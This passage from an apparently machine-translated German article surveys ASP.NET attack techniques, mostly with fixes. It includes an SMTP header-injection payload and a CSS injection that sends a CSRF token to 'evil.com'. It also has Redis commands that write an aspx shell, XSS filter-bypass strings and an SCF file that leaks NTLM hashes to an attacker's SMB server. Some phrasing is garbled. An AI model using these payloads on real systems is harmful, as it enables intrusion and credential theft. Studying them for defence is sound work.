Code</b></u> : <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">If</span></span> (IsPostBack) { String <span class="hljs-type"><span class="hljs-type">name</span></span> = Request.Form[‚Äú<span class="hljs-type"><span class="hljs-type">name</span></span>‚Äù]; String <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = Request.Form[‚Äú<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>‚Äù]; <span class="hljs-keyword"><span class="hljs-keyword">If</span></span> (<span class="hljs-type"><span class="hljs-type">name</span></span> != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span> &amp;&amp; <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span> &amp;&amp; FormsAuthentication.Authenticate(<span class="hljs-type"><span class="hljs-type">name</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">password</span></span>)) { FormsAuthentication.SetAuthCookie(<span class="hljs-type"><span class="hljs-type">name</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>); Response.Redirect(Request[‚ÄúReturnUrl‚Äù] ?? ‚Äú/‚Äù); } <span class="hljs-keyword"><span class="hljs-keyword">Else</span></span> { ModelState.AddModeError(‚Äúfail‚Äù, ‚Äú   .‚Äù + ‚Äú   ‚Äù); } }</code> </pre><br>  <b>Proof-of-Concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/DlkYQrkTiEs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <b>L√∂sung:</b> Dieser Fehler wurde in .Net 3.5 behoben <br><br>  <b>Remote-Debugging</b> <br><br>  <b>Beschreibung:</b> Da ASP.NET eine kompilierte Anwendung ist, verf√ºgt es √ºber bestimmte Debugging-Funktionen.  Mit Microsoft k√∂nnen Sie einen Remote-Debugger verwenden, um an der Debug-Version der Anwendung zu arbeiten. <br><br>  Wenn dieser Port im Internet ge√∂ffnet ist und durch ein einfaches Kennwort gesch√ºtzt ist oder √ºberhaupt kein Kennwort vorhanden ist, kann ein Debugger abgerufen werden.  Auf diese Weise k√∂nnen Sie die Anwendung im DEBUG-Modus beeinflussen.  Einschlie√ülich Herausziehen von Passw√∂rtern, √Ñndern der Logik, Durchf√ºhren von Tracing usw. <br><br>  <b>Proof-of-Concept</b> : <br><br><img src="https://habrastorage.org/webt/pl/f3/ba/plf3ba206usqwa10gt59go39w8k.png"><br><br>  <b>L√∂sung:</b> Verwenden Sie ein sicheres Kennwort und machen Sie den Dienst nicht zum Debuggen verf√ºgbar. <br><br>  <b>SMTP-Header-Injection</b> <br><br>  <b>Beschreibung:</b> Sie m√ºssen sich an eine kleine Spezifikation des SMTP-Protokolls erinnern. <br>  Ein Beispiel daf√ºr, wie ein normales einfaches SMTP-Nachrichtenpaket aussieht: <br><br><pre> <code class="hljs powershell">Received: from mail.bieberdorf.edu (mail.bieberdorf.edu [<span class="hljs-number"><span class="hljs-number">124.211</span></span><span class="hljs-type"><span class="hljs-type">.3.78</span></span>]) by mailhost.immense<span class="hljs-literal"><span class="hljs-literal">-isp</span></span>.com (<span class="hljs-number"><span class="hljs-number">8.8</span></span>.<span class="hljs-number"><span class="hljs-number">5</span></span>/<span class="hljs-number"><span class="hljs-number">8.7</span></span>.<span class="hljs-number"><span class="hljs-number">2</span></span>) with ESMTP id LAA20869 <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ; Tue, <span class="hljs-number"><span class="hljs-number">18</span></span> Mar <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">24</span></span> <span class="hljs-literal"><span class="hljs-literal">-0800</span></span> (PST) Received: from alpha.bieberdorf.edu (alpha.bieberdorf.edu [<span class="hljs-number"><span class="hljs-number">124.211</span></span><span class="hljs-type"><span class="hljs-type">.3.11</span></span>]) by mail.bieberdorf.edu (<span class="hljs-number"><span class="hljs-number">8.8</span></span>.<span class="hljs-number"><span class="hljs-number">5</span></span>) id <span class="hljs-number"><span class="hljs-number">004</span></span>A21; Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">17</span></span> <span class="hljs-literal"><span class="hljs-literal">-0800</span></span> (PST) From: rth@bieberdorf.edu (RT Hood) To: tmh@immense<span class="hljs-literal"><span class="hljs-literal">-isp</span></span>.com Date: Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> PST Message<span class="hljs-literal"><span class="hljs-literal">-Id</span></span>: &lt;rth031897143614<span class="hljs-literal"><span class="hljs-literal">-00000298</span></span>@mail.bieberdorf.edu&gt; X<span class="hljs-literal"><span class="hljs-literal">-Mailer</span></span>: Loris v2.<span class="hljs-number"><span class="hljs-number">32</span></span>  Lunch today?</code> </pre><br>  Wenn der in den Header "An" fallende Wert nicht validiert ist, ist es nat√ºrlich m√∂glich, den Brief an einen anderen Adressaten umzuleiten.  Dies w√§re jedoch zu einfach und offensichtlich, sodass die Validierung bereits auf .NET-Ebene erfolgt. <br><br>  Wenn Sie jedoch einen neuen Antwort-an-Header einf√ºhren - eine Adresse f√ºr Antworten -, wird bei vielen Formularen wie "Vergessenes Passwort" h√§ufig die Absenderadresse verwendet. Daher reicht es aus, Wagenr√ºcklauf- und Zeilenvorschubzeichen einzuf√ºhren und eine Arbeitslast zu erhalten. <br><br><pre> <code class="hljs julia">... From: rth<span class="hljs-meta"><span class="hljs-meta">@bieberdorf</span></span>.edu (RT Hood) To: tmh<span class="hljs-meta"><span class="hljs-meta">@immense</span></span>-isp.com/r/nReply-to:hack<span class="hljs-meta"><span class="hljs-meta">@hack</span></span>.ru <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>: Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> PST Message-Id: &lt;rth031897143614-<span class="hljs-number"><span class="hljs-number">00000298</span></span><span class="hljs-meta"><span class="hljs-meta">@mail</span></span>.bieberdorf.edu&gt; ...      : From: rth<span class="hljs-meta"><span class="hljs-meta">@bieberdorf</span></span>.edu (RT Hood) To: tmh<span class="hljs-meta"><span class="hljs-meta">@immense</span></span>-isp.com Reply-To: hack<span class="hljs-meta"><span class="hljs-meta">@hack</span></span>.ru <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>: Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> PST Message-Id: &lt;rth031897143614-<span class="hljs-number"><span class="hljs-number">00000298</span></span><span class="hljs-meta"><span class="hljs-meta">@mail</span></span>.bieberdorf.edu&gt;</code> </pre><br>  <b><u>Beispiel f√ºr anf√§lligen Code:</u></b> <br><br><pre> <code class="hljs python">MailAddress <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> = new MailAddress(‚Äú******@mail.r<span class="hljs-string"><span class="hljs-string">u", ‚Äútest"</span></span>); MailAddress to = new MailAddress(email); MailMessage m = new MailMessage(<span class="hljs-keyword"><span class="hljs-keyword">from</span></span>, to); m.Subject = <span class="hljs-string"><span class="hljs-string">""</span></span>; m.Body = <span class="hljs-string"><span class="hljs-string">"-"</span></span>; m.Headers.Add(‚ÄúTo<span class="hljs-string"><span class="hljs-string">", email); m.IsBodyHtml = true; SmtpClient smtp = new SmtpClient("</span></span>smtp.mail.r<span class="hljs-string"><span class="hljs-string">u", 587); smtp.Credentials = new NetworkCredential(‚Äú******@mail.ru"</span></span>, ‚Äú******<span class="hljs-string"><span class="hljs-string">"); smtp.EnableSsl = true; smtp.Send(m);</span></span></code> </pre><br>  <b>Proof-of-Concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/Bs_4_hpomig" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <b>L√∂sung:</b> Schreiben Sie keinen komplizierten Code, verwenden Sie frisches .Net <br><br>  <b>RCE in Teilansicht</b> <br><br>  <b>Beschreibung:</b> In der ASP.NET MVC-Terminologie gibt es zwei wichtige Konzepte: <br>  <b>Ansicht</b> ist die Ansicht, die der Benutzer sieht.  Wie bereits erw√§hnt, ist es dank Razor- oder Web Forms-Engines m√∂glich, serverseitigen Code zu implementieren. <br>  <b>Teilansicht</b> - <b>Teilansicht</b> .  Dies ist Teil des Inhalts der Ansicht, der der Einfachheit halber in einer separaten Datei entfernt wird. <br><br>  In der Teilansicht muss ein Feld vorhanden sein, das in HTML gerendert wird und in das eine gef√§hrliche Last eingegeben werden kann. <br><br>  <b>Beispiel laden:</b> Abrufen des Kennworts des aktuellen Benutzers <br><br><pre> <code class="hljs css">@((<span class="hljs-keyword"><span class="hljs-keyword">Account</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">Models</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">User</span></span>)<span class="hljs-keyword"><span class="hljs-keyword">Session</span></span>[‚Äú<span class="hljs-keyword"><span class="hljs-keyword">User</span></span>‚Äù].<span class="hljs-keyword"><span class="hljs-keyword">Password</span></span></code> </pre> <br>  Als Ergebnis des Aufrufs der Ansicht wird dieser Code ausgef√ºhrt.  Da die Richtlinien als Rasiermessermotor anerkannt werden.  Die folgende Abbildung zeigt, wie dies geschieht. <br><br>  <b>Algorithmus:</b> <br><br><ol><li>  Der Benutzer stellt eine Anfrage an die Steuerung. </li><li>  Der Controller rendert die Ansicht. </li><li>  Innerhalb der Ansicht wird eine Teilansicht angetroffen, wonach erneut eine Anforderung an die Steuerung gesendet wird, die f√ºr das Rendern der Teilansicht verantwortlich ist. </li><li>  Die fertige Teilansicht wird an die prim√§re und die prim√§re an den Benutzer zur√ºckgegeben. </li></ol><br><img src="https://habrastorage.org/webt/_j/si/qs/_jsiqsyffaujvq2hikalumgdxte.png"><br><br>  <b>Proof-of-Concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/KOupZQpCmdM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>Ein vereinfachtes Beispiel</b> : <br><br><pre> <code class="hljs pgsql">@{ Html.RenderPartial("Code", html); } Controller - <span class="hljs-built_in"><span class="hljs-built_in">public</span></span> ActionResult <span class="hljs-keyword"><span class="hljs-keyword">Index</span></span>(string html = "") { ViewBag.Html = html; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">View</span></span>(); } Partial <span class="hljs-keyword"><span class="hljs-keyword">view</span></span> ‚Äì   @model string @{ Layout = <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; } @Model <span class="hljs-keyword"><span class="hljs-keyword">Index</span></span> <span class="hljs-keyword"><span class="hljs-keyword">view</span></span> ‚Äì   @{ string html = ViewBag.Html.ToString(); } @{ Html.RenderPartial("Code", html); }</code> </pre><br>  <b>Proof-of-Concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/KOupZQpCmdM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>PS Der</b> Versuch zu reproduzieren ist erfolglos. <br><br>  <b>CSRF &amp; CSS-Injektion</b> <br><br>  Diese Sicherheitsanf√§lligkeiten implizieren eine Interaktion mit dem Benutzer. <br><br>  <b>CSRF (Cross Site Request Forgery)</b> - <b>Cross Site Request Forgery</b> . <br><br>  <b>Algorithmus:</b> <br><br><ol><li>  Der Benutzer kommt zur Hacker-Site. </li><li>  F√ºllt die Formularfelder aus; </li><li>  Daten aus dem Formular werden im Namen des Benutzers und mit seiner Rolle an eine andere Site gesendet. </li><li>  Daher hat der Benutzer, ohne es zu merken, einige Aktionen f√ºr eine andere Ressource ausgef√ºhrt. </li></ol><br>  Zum Schutz vor dieser Art von Angriff wurden CSRF-Token erfunden. In der Regel handelt es sich hierbei um eine Zeichenfolge, die eine Folge von Zeichen enth√§lt. <br><br>  Es wurde eine Sicherheitsl√ºcke gefunden, die den Schutz gegen CSRF umging.  Es war nur notwendig, einen String viel weniger als das Original als Token zu verwenden. <br><br>  <b>Normaler Token</b> <br><br><pre> <code class="hljs pgsql">&lt;<span class="hljs-keyword"><span class="hljs-keyword">input</span></span> <span class="hljs-keyword"><span class="hljs-keyword">type</span></span>="hidden" <span class="hljs-type"><span class="hljs-type">name</span></span>="__RequestVerificationToken" <span class="hljs-keyword"><span class="hljs-keyword">value</span></span>="CIhXcKin7XcwYn8Y1hNVgP5eOOhAMn37dnZtFzziOqhflM423Z5JKkVPciRopfgcPau5tj" /&gt;</code> </pre> <br>  <b>Anf√§lliger Token</b> <br><br><pre> <code class="hljs pgsql">&lt;<span class="hljs-keyword"><span class="hljs-keyword">input</span></span> <span class="hljs-keyword"><span class="hljs-keyword">type</span></span>="hidden" <span class="hljs-type"><span class="hljs-type">name</span></span>="__RequestVerificationToken" <span class="hljs-keyword"><span class="hljs-keyword">value</span></span>="ovomyQnYPxvPXfdxrjO1JEce3zPvGn" /&gt;</code> </pre> <br>  <b>Die Last, um das Token √ºber CSS (nicht XSS) zu stehlen:</b> <br>  Wenn das Abschneiden des Tokens nicht hilft, k√∂nnen Sie auf den CSS-Injection-Angriff zur√ºckgreifen, mit dem Sie das Token von der Seite stehlen und auf Ihre Ressource zeichnen k√∂nnen.  Dank dessen wird dem Benutzer ein echtes Token gegeben, und die erforderliche Anfrage auf der Site wird in seinem Namen gestellt. <br><br>  <b><u>Beispiel laden</u></b> : <br><br><pre> <code class="hljs xml">%0A{}*{color:red;} - Test <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag"> =</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"s"</span></span></span><span class="hljs-tag">&gt;</span></span> secret <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">style</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag"> =</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text/css"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="css"><span class="css"> </span><span class="hljs-selector-tag"><span class="css"><span class="hljs-selector-tag">div</span></span></span><span class="css"> </span><span class="hljs-selector-id"><span class="css"><span class="hljs-selector-id">#s</span></span></span><span class="css">:: </span><span class="hljs-selector-tag"><span class="css"><span class="hljs-selector-tag">-webkit-scrollbar-track-piece</span></span></span><span class="hljs-selector-pseudo"><span class="css"><span class="hljs-selector-pseudo">:vertical</span></span></span><span class="hljs-selector-pseudo"><span class="css"><span class="hljs-selector-pseudo">:increment</span></span></span><span class="css"> { </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">background</span></span></span><span class="css">: red </span><span class="hljs-built_in"><span class="css"><span class="hljs-built_in">url</span></span></span><span class="css">(//evil.com?s); } * {</span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">-o-link</span></span></span><span class="css">:</span><span class="hljs-string"><span class="css"><span class="hljs-string">'javascript:alert(1)'</span></span></span><span class="css">;</span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">-o-link-source</span></span></span><span class="css">: current;}</span></span></code> </pre><br>  <b>XXE in DocX</b> <br><br>  <b>Beschreibung:</b> ASP.NET verwendet wie andere Technologien viele L√∂sungen von Drittanbietern.  In einer dieser in ASP.NET integrierten L√∂sungen wurde die Sicherheitsanf√§lligkeit XXE (XML External Entities) gefunden, die aus einem XML-Parserfehler und der M√∂glichkeit besteht, externe Entit√§ten zu verbinden, die m√∂glicherweise kritische Daten enthalten.  Weitere Informationen zu XXE finden Sie auf den <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">OWASP-</a> Seiten. <br><br>  In diesem Fall ist die Komponente f√ºr das Laden und Parsen von docx-Dateien (Microsoft World) verantwortlich.  Da es sich bei jedem Office-Dokument tats√§chlich um eine Reihe von XML-Dateien handelt, kann das Parsen zu einem XXE-Angriff f√ºhren. <br><br>  <b>Algorithmus:</b> <br><br><ol><li>  Ausgepacktes B√ºrodokument; </li><li>  Die Last wird eingef√ºhrt; </li><li>  Es ist als docx zur√ºckgepackt; </li><li>  Es wird zur Verarbeitung auf den Server gegossen, wo eine anf√§llige Komponente verwendet wird. </li></ol><br>  <b>Proof-of-Concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/gCAU9M_E2xw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>RCE √ºber Redis</b> <br><br>  <b>Beschreibung:</b> Zus√§tzlich zu anf√§lligen Komponenten kann ASP.NET-Hacking mit anf√§lligen Technologien kombiniert werden.  Beispielsweise ist im Redis RAM-Speichersystem eine langj√§hrige Sicherheitsanf√§lligkeit bekannt, mit der beliebiger Code auf der Serverseite ausgef√ºhrt werden kann.  Als n√§chstes wird dieser Angriff in Bezug auf ASP betrachtet. <br><br>  <b>Algorithmus:</b> <br><br><ol><li>  Verbindung zu Redis.  Es ist wichtig, dass es auf demselben Server wie der Webserver ausgef√ºhrt wird. </li><li>  Durch Ausf√ºhren der folgenden Auflistung und Verwenden eines Webservers zum Anzeigen der resultierenden Seite wird beliebiger Code ausgef√ºhrt.  In diesem Fall rufen Sie den Rechner auf: </li></ol><br><pre> <code class="hljs swift">config <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> dir <span class="hljs-type"><span class="hljs-type">DIRNAME</span></span> config <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> dbfilename asd.aspx flushall <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> <span class="hljs-built_in"><span class="hljs-built_in">c</span></span> '&lt;%@ <span class="hljs-type"><span class="hljs-type">Page</span></span> <span class="hljs-type"><span class="hljs-type">Language</span></span>=<span class="hljs-string"><span class="hljs-string">"C#"</span></span> <span class="hljs-type"><span class="hljs-type">AutoEventWireup</span></span>=<span class="hljs-string"><span class="hljs-string">"true"</span></span> <span class="hljs-type"><span class="hljs-type">CodeBehind</span></span>=<span class="hljs-string"><span class="hljs-string">"asd.aspx.cs"</span></span> %&gt;&lt;% <span class="hljs-type"><span class="hljs-type">System</span></span>.<span class="hljs-type"><span class="hljs-type">Diagnostics</span></span>.<span class="hljs-type"><span class="hljs-type">Process</span></span>.<span class="hljs-type"><span class="hljs-type">Start</span></span>(<span class="hljs-string"><span class="hljs-string">"calc.exe"</span></span>); %&gt;' save</code> </pre><br>  <b>Proof-of-Concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/4p9UlWt9GMY" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>XSS ByPass-Filter</b> <br><br>  ASP.NET verf√ºgt √ºber einen eigenen Mechanismus zum Filtern von Daten aus Angriffen der XSS-Klasse.  Wenn Sie versuchen, verbotene Zeichen oder Signaturen zu √ºbertragen, wird der folgende Schutz ausgel√∂st: <br><br><img src="https://habrastorage.org/webt/og/-b/me/og-bmepcexanckl1pma1l8_71q4.png"><br><br>  Es gibt jedoch viele M√∂glichkeiten, diesen Schutz zu umgehen.  Hier sind einige davon: <br><br><ul><li>  % EF% BC% 9Cimg% 20src% 3Dxxx% 20onerror% 3D- <b>Alarm (1)</b> % EF% BC% 9E </li><li>  &lt;- / script&gt; <b>alert (1)</b> ; </li><li>  &lt;/ XSS / * - * / STYLE = xss: e / ** / xpression ( <b>Warnung ('XSS')</b> )&gt; </li><li>  % uff1cscript% uff1e <b>alert ('XSS')</b> ;% uff1c / script% uff1e </li></ul><br>  In den neuesten Versionen funktionieren diese Methoden nicht mehr. Wie bereits erw√§hnt, wurde die ASP.NET-Technologie haupts√§chlich f√ºr gro√üe und lange Projekte erstellt, sodass viele Ressourcen von dieser Sicherheitsanf√§lligkeit betroffen sein k√∂nnen. <br><br>  <b>Shell-Befehlsdatei</b> <br><br>  <b>Beschreibung:</b> Vor nicht allzu langer Zeit donnerte eine Sicherheitsl√ºcke im Zusammenhang mit dem Google Chrome-Browser, deren Kern darin besteht, den NTLM-Hash des Benutzers zu stehlen. <br><br>  <b>Algorithmus:</b> <br><br>  1) Eine Datei wird mit der Erweiterung scf und dem folgenden Inhalt erstellt <br><br><pre> <code class="hljs markdown">[Shell] IconFile=\\<span class="hljs-strong"><span class="hljs-strong">***.**</span></span>.<span class="hljs-emphasis"><span class="hljs-emphasis">*.*</span></span>**\icon</code> </pre><br>  Dabei ist IP anstelle von Sternchen die Adresse des SMB-Servers des Angreifers. <br><br>  2) Wenn es auf den Computer des Benutzers gelangt, muss diese Datei nicht einmal ge√∂ffnet werden.  Es reicht aus, wenn der Benutzer einfach in denselben Ordner wechselt, in dem sich diese Datei befindet.  Sobald dies geschieht, wird ein Hash-Paket an den SMB-Server gesendet. <br><br>  3) Somit kann Infrastruktur-Hacking auch mit einfachen Schwachstellen wie Open Redirect kombiniert werden. <br><br>  <b>Proof-of-Concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/_iTsFZvvXgg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br><div class="spoiler">  <b class="spoiler_title">Referenzen</b> <div class="spoiler_text">  ‚Ä¢ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">metanit.com/sharp/mvc5/12.1.php</a> <br>  ‚Ä¢ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">vimeo.com/35002943</a> <br>  ‚Ä¢ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">mybasictricks.blogspot.ru/2013/10/bypassing-xss-filters.html</a> <br>  ‚Ä¢ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">xakep.ru/2017/05/17/chrome-and-scf-files</a> <br>  ‚Ä¢ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">michaeldaw.org/news/news-030407</a> <br>  ‚Ä¢ codeby.net (SooLFaa) <br>  ‚Ä¢ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">antichat.ru</a> (SooLFaa) </div></div><br>  <b>Vielen Dank f√ºr Ihre Aufmerksamkeit!</b>  Teilen Sie Ihre Erfahrungen mit und hinterlassen Sie Fragen an Alexei Morozov (auch bekannt als <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">SoolFaa</a> ) in den Kommentaren zu diesem Artikel. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de413649/">https://habr.com/ru/post/de413649/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de413637/index.html">Google hat 7 KI-Ethikprinzipien ver√∂ffentlicht</a></li>
<li><a href="../de413639/index.html">Gesch√ºtzte Smartphones: Wer braucht sie und wie unterscheiden sie sich voneinander?</a></li>
<li><a href="../de413641/index.html">Die Kontroverse des Design Thinking</a></li>
<li><a href="../de413643/index.html">Aitracking - der beste L√ºgendetektor</a></li>
<li><a href="../de413647/index.html">Finden Sie heraus, wer Sie in der Welt des maschinellen Lernens sind</a></li>
<li><a href="../de413651/index.html">Computerspiel: Schutz der Rechte an geistigem Eigentum von Entwicklern</a></li>
<li><a href="../de413653/index.html">Probabilistische Programmierung und die Bayes'sche Methode f√ºr Hacker</a></li>
<li><a href="../de413655/index.html">Welche Texte f√ºr Landing Pages verkaufen sie wirklich?</a></li>
<li><a href="../de413657/index.html">Das neuronale Netzwerk von Uber erkennt Benutzer in einem ‚Äûungew√∂hnlichen‚Äú Zustand</a></li>
<li><a href="../de413661/index.html">Saga der elektronischen Dienste und ihrer Standorte. Teil 1. Elektronischer Dienst</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>